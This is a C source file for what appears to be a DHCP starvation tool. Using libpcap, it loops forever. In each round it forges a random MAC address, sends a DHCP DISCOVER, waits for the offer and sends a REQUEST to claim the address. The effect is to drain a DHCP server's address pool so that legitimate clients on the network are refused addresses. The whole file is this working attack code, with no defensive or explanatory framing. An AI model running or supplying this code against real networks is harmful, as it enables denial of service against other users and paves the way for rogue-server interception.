#include "global.h"

void dhcp_discover(){
  int len = 0;
  u_char packet[4096];
  struct udphdr *udp_header;
  struct ip *ip_header;
  dhcp_t *dhcp;

  ip_header = (struct ip *)(packet + sizeof(struct ether_header));
  udp_header = (struct udphdr *)(((char *)ip_header) + sizeof(struct ip));
  dhcp = (dhcp_t *)(((char *)udp_header) + sizeof(struct udphdr));

  // message type
  u_int8_t option = DHCP_DISCOVER;
  len += dhcp_option(&dhcp->bp_options[len], DHCP_MSG_TYPE, &option, sizeof(option));

  // end of options
  option = 0;
  len += dhcp_option(&dhcp->bp_options[len], DHCP_OPT_END, &option, sizeof(option));

  // create packet
  dhcp_output(dhcp, mac, &len);
  udp_output(udp_header, &len);
  ip_output(ip_header, &len);
  ether_output(packet, mac, len);
}

void dhcp_request(){
  int len = 0;
  u_char packet[4096];
  struct udphdr *udp_header;
  struct ip *ip_header;
  dhcp_t *dhcp;

  ip_header = (struct ip *)(packet + sizeof(struct ether_header));
  udp_header = (struct udphdr *)(((char *)ip_header) + sizeof(struct ip));
  dhcp = (dhcp_t *)(((char *)udp_header) + sizeof(struct udphdr));

  // message type
  u_int8_t option = DHCP_REQUEST;
  len += dhcp_option(&dhcp->bp_options[len], DHCP_MSG_TYPE, &option, sizeof(option));

  // DHCP options
  len += dhcp_option(&dhcp->bp_options[len], DHCP_REQ_IP, (u_int8_t *)&ip, sizeof(ip));
  len += dhcp_option(&dhcp->bp_options[len], DHCP_SERVER_ID, (u_int8_t *)&server, sizeof(server));

  // end of options
  option = 0;
  len += dhcp_option(&dhcp->bp_options[len], DHCP_OPT_END, &option, sizeof(option));

  // create packet
  dhcp_output(dhcp, mac, &len);
  udp_output(udp_header, &len);
  ip_output(ip_header, &len);
  ether_output(packet, mac, len);
}

void timeout(){
  pcap_breakloop(pcap_handle);
  printf("Timed out\n");
  timed_out = 1;
}

int main(int argc, char *argv[]){

  char errbuf[PCAP_ERRBUF_SIZE];

  // wrong arguments, help
  if (argc != 3 || (strcmp(argv[1], "-i") != 0)){
    printf("Usage: %s -i interface\n", argv[0]);
    return 0;
  }

  // real MAC address of the interface
  char *dev = argv[2];
  if(mac_address(dev, mac)){
    fprintf(stderr, "Unable to get MAC address for '%s'\n", dev);
    return 1;
  }

  // opening the device to capture
  pcap_handle = pcap_open_live(dev, BUFSIZ, 0, 10, errbuf);
  if(pcap_handle == NULL){
    fprintf(stderr, "Couldn't open device: %s\n", errbuf);
    return 1;
  }

  // printing real MAC
  printf("%s real MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", dev, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

  // randomize
  srand(time(NULL));

  // main infinite loop
  while(1){

    // generating fake MAC
    mac[3] = rand()%256;
    mac[4] = rand()%256;
    mac[5] = rand()%256;

    // out of time
    timed_out = 0;
    printf("\nFake MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    // Sending DHCP_DISCOVER
    printf("Sending DHCP_DISCOVER\n");
    dhcp_discover();

    ip = 0;
    printf("Waiting for DHCP_OFFER...\n");

    // setting up timeout
    alarm(TIMEOUT);
    signal(SIGALRM, timeout);

    // waiting for DHCP_OFFER
    pcap_loop(pcap_handle, -1, ether_input, NULL);

    // checking for timeout
    if(timed_out) continue;

    // printing some information
    u_int32_t h_ip = htonl(ip);
    u_int32_t h_server = htonl(server);
    printf("Got IP %u.%u.%u.%u from ", h_ip >> 24, ((h_ip << 8) >> 24), (h_ip << 16) >> 24, (h_ip << 24) >> 24);
    printf("server %u.%u.%u.%u\n", h_server >> 24, ((h_server << 8) >> 24), (h_server << 16) >> 24, (h_server << 24) >> 24);

    // sending DHCP_REQUEST
    printf("Sending DHCP_REQUEST\n");
    dhcp_request();

  }

  pcap_close(pcap_handle);
  return 0;
}
